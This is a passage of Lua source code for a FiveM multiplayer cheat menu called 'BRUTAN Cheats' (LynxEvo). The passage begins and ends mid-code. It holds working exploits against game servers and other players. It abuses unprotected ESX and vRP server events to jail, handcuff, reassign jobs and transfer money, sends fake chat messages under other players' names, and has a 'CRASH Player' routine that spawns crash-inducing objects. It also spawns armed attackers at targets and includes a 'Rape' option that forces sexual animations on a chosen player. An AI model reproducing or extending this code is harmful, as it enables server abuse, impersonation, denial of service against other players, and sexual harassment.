			for dM, dN in pairs(bp) do
				if dM == dE.name and GetVehicleMod(veh, dE.id)  ~= dL.data.realIndex then price = "Not Installed"
		elseif dM == dE.name and bg and GetVehicleMod(veh, dE.id) == dL.data.realIndex then price = "Previewing"
		elseif dM == dE.name and GetVehicleMod(veh, dE.id) == dL.data.realIndex then price = "Installed"
		end end;
		if dL.menuName == "~h~~b~Stock"
		then end;
		if dE.name == "Horns"
		then
		for dO, dP in pairs(bp) do
			if dP ==
		ci - 1 then dL.menuName = dO end end end;
		if dL.menuName == "NULL"
		then dL.menuName = "unknown"
		end;
		if LynxEvo.Button(dL.menuName) then
		if not bg then bi = dE.id; bh = GetVehicleMod(veh, dE.id) bg = true;
		if dL.data.realIndex == -1 then bk = "rm"
		RemoveVehicleMod(veh, dL.data.modid) bg = false; bi = -1; bh = -1; bk = false
		else bk = false; SetVehicleMod(veh, dE.id, dL.data.realIndex, false) end elseif bg and GetVehicleMod(veh, dE.id) == dL.data.realIndex then bg = false; bi = -1; bh = -1; bk = false;
		if dL.data.realIndex == -1 then RemoveVehicleMod(veh, dL.data.modid)
		else SetVehicleMod(veh, dE.id, dL.data.realIndex, false) end elseif bg and GetVehicleMod(veh, dE.id)  ~= dL.data.realIndex then
		if dL.data.realIndex == -1 then RemoveVehicleMod(veh, dL.data.modid) bg = false; bi = -1; bh = -1; bk = false
		else SetVehicleMod(veh, dE.id, dL.data.realIndex, false) bg = true end end end end; LynxEvo.Display() end end end;
		for i, dE in pairs(bm) do
			if LynxEvo.
		IsMenuOpened(dE.id) then
		if GetVehicleMod(veh, dE.id) == 0 then pricestock = "Not Installed"
		price1 = "Installed"
		price2 = "Not Installed"
		price3 = "Not Installed"
		price4 = "Not Installed"
		elseif GetVehicleMod(veh, dE.id) == 1 then pricestock = "Not Installed"
		price1 = "Not Installed"
		price2 = "Installed"
		price3 = "Not Installed"
		price4 = "Not Installed"
		elseif GetVehicleMod(veh, dE.id) == 2 then pricestock = "Not Installed"
		price1 = "Not Installed"
		price2 = "Not Installed"
		price3 = "Installed"
		price4 = "Not Installed"
		elseif GetVehicleMod(veh, dE.id) == 3 then pricestock = "Not Installed"
		price1 = "Not Installed"
		price2 = "Not Installed"
		price3 = "Not Installed"
		price4 = "Installed"
		elseif GetVehicleMod(veh, dE.id) == -1 then pricestock = "Installed"
		price1 = "Not Installed"
		price2 = "Not Installed"
		price3 = "Not Installed"
		price4 = "Not Installed"
		end;
		if LynxEvo.Button("Stock "..dE.name, pricestock) then SetVehicleMod(veh, dE.id, -1) elseif LynxEvo.Button(dE.name..
			" Upgrade 1", price1) then SetVehicleMod(veh, dE.id, 0) elseif LynxEvo.Button(dE.name..
			" Upgrade 2", price2) then SetVehicleMod(veh, dE.id, 1) elseif LynxEvo.Button(dE.name..
			" Upgrade 3", price3) then SetVehicleMod(veh, dE.id, 2) elseif dE.id ~= 13 and dE.id ~= 12 and LynxEvo.Button(dE.name..
			" Upgrade 4", price4) then SetVehicleMod(veh, dE.id, 3) end; LynxEvo.Display() end end;
		if LynxEvo.IsMenuOpened("LynxX") then local dQ = PlayerId(-1) local bH = GetPlayerName(dQ) av("BRUTAN Cheats", false) av("Best FiveM CHEATS?! YES, BRUTAN CHEATS~! - @Brutan#7799", false) if LynxEvo.MenuButton("~h~~p~#~s~ Self Menu", "SelfMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Online Players", "OnlinePlayerMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Teleport Menu", "TeleportMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Vehicle Menu", "VehicleMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Weapon Menu", "WeaponMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Lua Menu ~o~~h~:3", "LuaMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Advanced Mode ~o~~h~xD", "AdvM") then elseif LynxEvo.MenuButton("~h~~p~# ~y~BRUTAN Community", "crds") then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("SelfMenu") then
		if LynxEvo.CheckBox("~h~~g~Godmode", Godmode, function(dR) Godmode = dR end) then elseif LynxEvo.Button("~h~~y~Semi ~g~Godmode") then local dS = "stt_prop_stunt_soccer_ball"
		while not HasModelLoaded(GetHashKey(dS)) do Citizen.Wait(0) RequestModel(GetHashKey(dS)) end;
		local dT = CreateObject(GetHashKey(dS), 0, 0, 0, true, true, false) SetEntityVisible(dT, 0, 0) AttachEntityToEntity(dT, GetPlayerPed(-1), GetPedBoneIndex(GetPlayerPed(-1), 57005), 0, 0, -1.0, 0, 0, 0, false, true, true, true, 1, true) elseif LynxEvo.CheckBox("~h~~g~Player Visible", d4, function(dR) d4 = dR end) then elseif LynxEvo.Button("~h~~r~Suicide") then SetEntityHealth(PlayerPedId(-1), 0) elseif LynxEvo.Button("~h~~g~ESX~s~ Revive Yourself~s~") then TriggerEvent("esx_ambulancejob:revive") elseif LynxEvo.Button("~h~~g~Heal/Revive") then SetEntityHealth(PlayerPedId(-1), 200) elseif LynxEvo.Button("~h~~b~Give Armour") then SetPedArmour(PlayerPedId(-1), 200) elseif LynxEvo.CheckBox("~h~Infinite Stamina", InfStamina, function(dR) InfStamina = dR end) then elseif LynxEvo.CheckBox("~h~Thermal ~o~Vision", bTherm, function(bTherm) end) then therm = not therm; bTherm = therm; SetSeethrough(therm) elseif LynxEvo.CheckBox("~h~Fast Run", fastrun, function(dR) fastrun = dR end) then elseif LynxEvo.CheckBox("~h~Super Jump", SuperJump, function(dR) SuperJump = dR end) then elseif LynxEvo.CheckBox("~h~Noclip", Noclip, function(dR) Noclip = dR end) then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("OnlinePlayerMenu") then
		for i = 0, 128 do
			if NetworkIsPlayerActive(i)
		and GetPlayerServerId(i)  ~= 0 and LynxEvo.MenuButton(GetPlayerName(i)..
			" ~p~["..GetPlayerServerId(i)..
			"]~s~ ~y~["..i..
			"]~s~ "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~h~~r~DEAD"
				or "~h~~g~ALIVE"), 'PlayerOptionsMenu') then SelectedPlayer = i end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("PlayerOptionsMenu") then LynxEvo.SetSubTitle("PlayerOptionsMenu", "Player Options ["..GetPlayerName(SelectedPlayer)..
			"]") if LynxEvo.MenuButton("~h~~p~#~s~ ESX Triggers", "ESXTriggerini") then elseif LynxEvo.MenuButton("~h~~p~#~s~ ESX Jobs", "ESXJobs2") then elseif LynxEvo.MenuButton("~h~~p~#~s~ VRP Triggers", "VRPPlayerTriggers") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Troll Menu", "Trollmenu") then elseif LynxEvo.Button("~h~Spectate", cC and "~g~[SPECTATING]") then SpectatePlayer(SelectedPlayer) elseif LynxEvo.Button("~h~~r~Semi GOD ~s~Player") then local dS = "stt_prop_stunt_soccer_ball"
		while not HasModelLoaded(GetHashKey(dS)) do Citizen.Wait(0) RequestModel(GetHashKey(dS)) end;
		local dT = CreateObject(GetHashKey(dS), 0, 0, 0, true, true, false) SetEntityVisible(dT, 0, 0) AttachEntityToEntity(dT, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0, 0, -1.0, 0, 0, 0, false, true, true, true, 1, true) elseif LynxEvo.Button("~h~~g~Heal ~s~Player") then local dU = "PICKUP_HEALTH_STANDARD"
		local dV = GetHashKey(dU) local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer)) CreateAmbientPickup(dV, bK.x, bK.y, bK.z + 1.0, 1, 1, dV, 1, 0) SetPickupRegenerationTime(pickup, 60) elseif LynxEvo.Button("~h~~b~Armour ~s~Player") then local dW = "PICKUP_ARMOUR_STANDARD"
		local dX = GetHashKey(dW) local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer)) local pickup = CreateAmbientPickup(dX, bK.x, bK.y, bK.z + 1.0, 1, 1, dX, 1, 0) SetPickupRegenerationTime(pickup, 60) elseif LynxEvo.Button("~h~~b~FULL Armour ~s~Player") then local dW = "PICKUP_ARMOUR_STANDARD"
		local dX = GetHashKey(dW) local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer)) for i = 0, 99 do Citizen.Wait(0) CreateAmbientPickup(dX, bK.x, bK.y, bK.z + 1.0, 1, 1, dX, 1, 0) SetPickupRegenerationTime(pickup, 10) i = i + 1 end elseif LynxEvo.Button("~h~Teleport To") then
		if
		cO then local confirm = KeyboardInput("Are you sure? y/n", "", 0) if confirm == "y"
		then local Entity = IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1) SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false) elseif confirm == "n"
		then av("~h~~b~Operation cancelled~s~.", false)
		else av("~h~~b~Invalid Confirmation~s~.", true) av("~h~~b~Operation cancelled~s~.", false) end
		else local Entity = IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1) SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false) end elseif LynxEvo.CheckBox("~h~Freeze Player", freezeplayer, function(dR) freezeplayer = dR end) then elseif LynxEvo.MenuButton("~h~~p~#~s~ Give Single Weapon", "GiveSingleWeaponPlayer") then elseif LynxEvo.Button("~h~Give ~r~All Weapons") then
		for i = 1, #b6 do GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(b6[i]), 1000, false, false) end elseif LynxEvo.Button("~h~Remove ~r~All Weapons") then RemoveAllPedWeapons(PlayerPedId(SelectedPlayer), true) elseif LynxEvo.Button("~h~Give ~r~Vehicle") then local ped = GetPlayerPed(SelectedPlayer) local cb = KeyboardInput("Enter Vehicle Spawn Name", "", 100) if cb
		and IsModelValid(cb) and IsModelAVehicle(cb) then RequestModel(cb) while not HasModelLoaded(cb) do Citizen.Wait(0) end;
		local veh = CreateVehicle(GetHashKey(cb), GetEntityCoords(ped), GetEntityHeading(ped) + 90, true, true)
		else av("~b~Model is not valid!", true) end elseif LynxEvo.Button("~h~Send To ~r~Jail") then TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(selectedPlayer), 5000, "Jailed") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(selectedPlayer), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(selectedPlayer), 45 * 60, "Jailed") elseif LynxEvo.Button("~h~~g~Evade ~s~From Jail") then local dY = SelectedPlayer; TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(dY), 0, "escaperino") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(dY), 0) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(dY), 0) TriggerServerEvent("js:jailuser", GetPlayerServerId(dY), 0, "escaperino") end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("ESXTriggerini") then
		if LynxEvo.Button("~h~~g~Revive Player") then local ax = GetPlayerPed(SelectedPlayer) local bK = GetEntityCoords(ax) TriggerServerEvent("esx_ambulancejob:setDeathStatus", false) local dZ = {
			x = ESX.Math.Round(bK.x, 1), y = ESX.Math.Round(bK.y, 1), z = ESX.Math.Round(bK.z, 1)
		}
		RespawnPed(ax, dZ, 0.0) StopScreenEffect('DeathFailOut') DoScreenFadeIn(800) elseif LynxEvo.Button("~h~~g~Give money to player from your wallet") then local m = KeyboardInput("Enter amount of money to give", "", 100) if m ~= ""
		then TriggerServerEvent("esx:giveInventoryItem", GetPlayerServerId(SelectedPlayer), "item_money", "money", m) end elseif LynxEvo.Button("~h~~b~Handcuff Player") then TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(SelectedPlayer)) end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("VRPPlayerTriggers") then
		if LynxEvo.Button("~h~Transfer money from your bank") then local d_ = KeyboardInput("Enter amount of money to give", "", 100) local e0 = KeyboardInput("Enter VRP PERMA ID!", "", 100) if d_ ~= ""
		then local di = GetPlayerServerId(PlayerId()) TriggerEvent("bank:transfer", di, GetPlayerServerId(SelectedPlayer), d_) TriggerServerEvent("bank:transfer", e0, d_) end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("ESXJobs2") then
		if LynxEvo.Button("~h~Set Unemployed") then TriggerServerEvent("NB:destituerplayer", GetPlayerServerId(SelectedPlayer)) UnemployedPlayer(SelectedPlayer) elseif LynxEvo.Button("~h~Set ~b~Police ~s~Job") then TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "police", 3) PolicePlayer(SelectedPlayer) elseif LynxEvo.Button("~h~Set ~o~Mecano ~s~Job") then TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "mecano", 3) MecanoPlayer(SelectedPlayer) elseif LynxEvo.Button("~h~Set ~y~Taxi ~s~Job") then TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "taxi", 3) TaxiPlayer(SelectedPlayer) elseif LynxEvo.Button("~h~Set ~r~Ambulance ~s~Job") then TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "ambulance", 3) AmbulancePlayer(SelectedPlayer) elseif LynxEvo.Button("~h~Set ~g~Real Estate ~s~Job") then TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "realestateagent", 3) RealEstateAgentPlayer(SelectedPlayer) elseif LynxEvo.Button("~h~Set ~r~Car ~b~Dealer ~s~Job") then TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(SelectedPlayer), "cardealer", 3) CarDealerPlayer(SelectedPlayer) end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("Trollmenu") then
		if LynxEvo.MenuButton("~h~~p~#~s~ Spawn Peds", "SpawnPeds") then elseif LynxEvo.Button("~h~~r~Fake ~s~Chat Message") then local e1 = KeyboardInput("Enter message to send", "", 100) local e2 = GetPlayerName(SelectedPlayer) if e1 then TriggerServerEvent("_chat:messageEntered", e2, {
			0, 0x99, 255
		}, e1) end elseif LynxEvo.Button("~h~~r~Kick ~s~From Vehicle") then ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer)) elseif LynxEvo.Button("~h~~y~Explode ~s~Vehicle") then
		if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
		else av("~h~~b~Player not in a vehicle~s~.", false) end elseif LynxEvo.Button("~h~~r~Launch ~s~his car") then
		if GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false)  ~= 0 then local e3 = GetEntityCoords(GetPlayerPed(SelectedPlayer)) local e4 = GetEntityHeading(GetPlayerPed(SelectedPlayer)) local e5 = CreatePed(5, 68070371, e3, e4, true) local e6 = CreateVehicle(GetHashKey("adder"), e3, e4, true, false) SetPedIntoVehicle(e5, e6, -1)
		else av("~h~~b~Player not in a vehicle~s~.", false) end elseif LynxEvo.Button("~h~~r~Banana ~p~Party") then local bH = CreateObject(GetHashKey("p_crahsed_heli_s"), 0, 0, 0, true, true, true) local bI = CreateObject(GetHashKey("prop_rock_4_big2"), 0, 0, 0, true, true, true) local bJ = CreateObject(GetHashKey("prop_beachflag_le"), 0, 0, 0, true, true, true) AttachEntityToEntity(bH, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) AttachEntityToEntity(bI, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) AttachEntityToEntity(bJ, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) elseif LynxEvo.Button("~h~~r~Explode") then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, 100000.0) AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, true) elseif LynxEvo.Button("~h~~r~Rape") then RequestModelSync("a_m_o_acult_01") RequestAnimDict("rcmpaparazzo_2") while not HasAnimDictLoaded("rcmpaparazzo_2") do Citizen.Wait(0) end;
			if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true) while not NetworkHasControlOfEntity(veh) do NetworkRequestControlOfEntity(veh) Citizen.Wait(0) end;
		SetEntityAsMissionEntity(veh, true, true) DeleteVehicle(veh) DeleteEntity(veh) end; count = -0.2;
		for b = 1, 3 do local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true)) local bS = CreatePed(4, GetHashKey("a_m_o_acult_01"), x, y, z, 0.0, true, false) SetEntityAsMissionEntity(bS, true, true) AttachEntityToEntity(bS, GetPlayerPed(SelectedPlayer), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true) ClearPedTasks(GetPlayerPed(SelectedPlayer)) TaskPlayAnim(GetPlayerPed(SelectedPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0) SetPedKeepTask(bS) TaskPlayAnim(bS, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0) SetEntityInvincible(bS, true) count = count - 0.4 end elseif LynxEvo.Button("~h~~r~Cage ~s~Player") then x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer))) roundx = tonumber(string.format("%.2f", x)) roundy = tonumber(string.format("%.2f", y)) roundz = tonumber(string.format("%.2f", z)) local e7 = "prop_fnclink_05crnr1"
		local
		e8 = GetHashKey(e7) RequestModel(e8) while not HasModelLoaded(e8) do Citizen.Wait(0) end;
		local e9 = CreateObject(e8, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false) local ea = CreateObject(e8, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false) SetEntityHeading(e9, -90.0) SetEntityHeading(ea, 90.0) FreezeEntityPosition(e9, true) FreezeEntityPosition(ea, true) elseif LynxEvo.Button("~h~~r~Hamburgher ~s~Player") then local eb = "xs_prop_hamburgher_wl"
		local ec = GetHashKey(eb) local ed = CreateObject(ec, 0, 0, 0, true, true, true) AttachEntityToEntity(ed, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true) elseif LynxEvo.Button("~h~~r~Hamburgher ~s~Player Car") then local eb = "xs_prop_hamburgher_wl"
		local ec = GetHashKey(eb) local ed = CreateObject(ec, 0, 0, 0, true, true, true) AttachEntityToEntity(ed, GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true) elseif LynxEvo.Button("~h~~r~Snowball troll ~s~Player") then j = true; x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer))) roundx = tonumber(string.format("%.2f", x)) roundy = tonumber(string.format("%.2f", y)) roundz = tonumber(string.format("%.2f", z)) local ee = "sr_prop_spec_tube_xxs_01a"
		local ef = GetHashKey(ee) RequestModel(ef) RequestModel(smashhash) while not HasModelLoaded(ef) do Citizen.Wait(0) end;
		local eg = CreateObject(ef, roundx, roundy, roundz - 5.0, true, true, false) SetEntityRotation(eg, 0.0, 90.0, 0.0) local eh = -356333586; local bR = "WEAPON_SNOWBALL"
		for i = 0, 10 do local bK = GetEntityCoords(eg) RequestModel(eh) Citizen.Wait(50) if HasModelLoaded(eh)
		then local ped = CreatePed(21, eh, bK.x + math.sin(i * 2.0), bK.y - math.sin(i * 2.0), bK.z - 5.0, 0, true, true) and CreatePed(21, eh, bK.x - math.sin(i * 2.0), bK.y + math.sin(i * 2.0), bK.z - 5.0, 0, true, true) NetworkRegisterEntityAsNetworked(ped) if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then local ei = PedToNet(ped) NetworkSetNetworkIdDynamic(ei, false) SetNetworkIdCanMigrate(ei, true) SetNetworkIdExistsOnAllMachines(ei, true) Citizen.Wait(500) NetToPed(ei) GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1) SetCurrentPedWeapon(ped, GetHashKey(bR), true) SetEntityInvincible(ped, true) SetPedCanSwitchWeapon(ped, true) TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16) elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
		else Citizen.Wait(0) end end end elseif LynxEvo.Button("~h~~o~_!_ ~r~CRASH ~s~Player ~o~_!_") then local ej = GetEntityCoords(GetPlayerPed(SelectedPlayer)) local ek = {
			0x9CF21E0F, 0x34315488, 0x6A27FEB1, 0xCB2ACC8, 0xC6899CDE, 0xD14B5BA3, 0xD9F4474C, 0x32A9996C, 0x69D4F974, 0xCAFC1EC3, 0x79B41171, 0x1075651, 0xC07792D4, 0x781E451D, 0x762657C6, 0xC2E75A21, 0xC3C00861, 0x81FB3FF0, 0x45EF7804, 0xE65EC0E4, 0xE764D794, 0xFBF7D21F, 0xE1AEB708, 0xA5E3D471, 0xD971BBAE, 0xCF7A9A9D, 0xC2CC99D8, 0x8FB233A4, 0x24E08E1F, 0x337B2B54, 0xB9402F87, 0x4F2526DA
		}
		for i = 1, #ek do local a = CreateObject(ek[i], ej, true, true, true) end end;
		LynxEvo.Display() elseif LynxEvo.IsMenuOpened("SpawnPeds") then
		if LynxEvo.Button("~h~~r~Spawn ~s~Swat army with ~y~AK") then local bQ = "s_m_y_swat_01"
		local bR = "WEAPON_ASSAULTRIFLE"
		for i = 0, 10 do local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer)) RequestModel(GetHashKey(bQ)) Citizen.Wait(50) if HasModelLoaded(GetHashKey(bQ))
		then local ped = CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true) NetworkRegisterEntityAsNetworked(ped) if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then local ei = PedToNet(ped) NetworkSetNetworkIdDynamic(ei, false) SetNetworkIdCanMigrate(ei, true) SetNetworkIdExistsOnAllMachines(ei, true) Citizen.Wait(500) NetToPed(ei) GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1) SetEntityInvincible(ped, true) SetPedCanSwitchWeapon(ped, true) TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16) elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
		else Citizen.Wait(0) end end end elseif LynxEvo.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then local bQ = "s_m_y_swat_01"
		local bR = "weapon_rpg"
		for i = 0, 10 do local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer)) RequestModel(GetHashKey(bQ)) Citizen.Wait(50) if HasModelLoaded(GetHashKey(bQ))
		then local ped = CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true) NetworkRegisterEntityAsNetworked(ped) if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then local ei = PedToNet(ped) NetworkSetNetworkIdDynamic(ei, false) SetNetworkIdCanMigrate(ei, true) SetNetworkIdExistsOnAllMachines(ei, true) Citizen.Wait(500) NetToPed(ei) GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1) SetEntityInvincible(ped, true) SetPedCanSwitchWeapon(ped, true) TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16) elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
		else Citizen.Wait(0) end end end elseif LynxEvo.Button("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then local bQ = "s_m_y_swat_01"
		local bR = "weapon_flaregun"
		for i = 0, 10 do local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer)) RequestModel(GetHashKey(bQ)) Citizen.Wait(50) if HasModelLoaded(GetHashKey(bQ))
		then local ped = CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true) NetworkRegisterEntityAsNetworked(ped) if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then local ei = PedToNet(ped) NetworkSetNetworkIdDynamic(ei, false) SetNetworkIdCanMigrate(ei, true) SetNetworkIdExistsOnAllMachines(ei, true) Citizen.Wait(500) NetToPed(ei) GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1) SetEntityInvincible(ped, true) SetPedCanSwitchWeapon(ped, true) TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16) elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
		else Citizen.Wait(0) end end end elseif LynxEvo.Button("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then local bQ = "s_m_y_swat_01"
		local bR = "weapon_railgun"
		for i = 0, 10 do local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer)) RequestModel(GetHashKey(bQ)) Citizen.Wait(50) if HasModelLoaded(GetHashKey(bQ))
		then local ped = CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true) NetworkRegisterEntityAsNetworked(ped) if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then local ei = PedToNet(ped) NetworkSetNetworkIdDynamic(ei, false) SetNetworkIdCanMigrate(ei, true) SetNetworkIdExistsOnAllMachines(ei, true) Citizen.Wait(500) NetToPed(ei) GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1) SetEntityInvincible(ped, true) SetPedCanSwitchWeapon(ped, true) TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16) elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
		else Citizen.Wait(0) end end end end; LynxEvo.Display() elseif IsDisabledControlPressed(0, 121) or IsDisabledControlPressed(0, 47) and IsDisabledControlPressed(0, 21) or IsDisabledControlPressed(0, 36) then
		if mhaonn then LynxEvo.OpenMenu("LynxX")
		else bE() end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("TeleportMenu") then
		if LynxEvo.Button("~h~Teleport to ~g~waypoint") then c6() elseif LynxEvo.Button("~h~Teleport into ~g~nearest ~s~vehicle") then b_() elseif LynxEvo.Button("~h~Teleport to ~r~coords") then bT() elseif LynxEvo.Button("~h~Draw custom ~r~blip ~s~on map") then bX() elseif LynxEvo.CheckBox("~h~Show ~g~Coords", showCoords, function(dR) showCoords = dR end) then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("WeaponMenu") then
		if LynxEvo.MenuButton("~h~~p~#~s~ Give Single Weapon", "WeaponTypes") then elseif LynxEvo.Button("~h~~g~Give All Weapons") then
		for i = 1, #b6 do GiveWeaponToPed(PlayerPedId(-1), GetHashKey(b6[i]), 1000, false, false) end elseif LynxEvo.Button("~h~~r~Remove All Weapons") then RemoveAllPedWeapons(PlayerPedId(-1), true) elseif LynxEvo.Button("~h~Drop your current Weapon") then local ak = GetPlayerPed(-1) local b = GetSelectedPedWeapon(ak) SetPedDropsInventoryWeapon(GetPlayerPed(-1), b, 0, 2.0, 0, -1) elseif LynxEvo.Button("~h~~g~Give All Weapons to ~s~everyone") then
		for
		el = 0, 128 do
			if el ~=
		PlayerId(-1) and GetPlayerServerId(el)  ~= 0 then
		for i = 1, #b6 do GiveWeaponToPed(GetPlayerPed(el), GetHashKey(b6[i]), 1000, false, false) end end end elseif LynxEvo.Button("~h~~r~Remove All Weapons from ~s~everyone") then
		for
		el = 0, 128 do
			if el ~=
		PlayerId(-1) and GetPlayerServerId(el)  ~= 0 then
		for i = 1, #b6 do RemoveWeaponFromPed(GetPlayerPed(el), GetHashKey(b6[i])) end end end elseif LynxEvo.Button("~h~Give Ammo") then
		for
		i = 1, #b6 do AddAmmoToPed(PlayerPedId(-1), GetHashKey(b6[i]), 200) end elseif LynxEvo.CheckBox("~h~~r~OneShot Kill", oneshot, function(dR) oneshot = dR end) then elseif LynxEvo.CheckBox("~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Flare Gun", rainbowf, function(dR) rainbowf = dR end) then elseif LynxEvo.CheckBox("~h~Vehicle Gun", VehicleGun, function(dR) VehicleGun = dR end) then elseif LynxEvo.CheckBox("~h~Delete Gun", DeleteGun, function(dR) DeleteGun = dR end) then end;
		LynxEvo.Display() elseif LynxEvo.IsMenuOpened("tunings") then veh = GetVehiclePedIsUsing(PlayerPedId()) for i, dE in pairs(bl) do
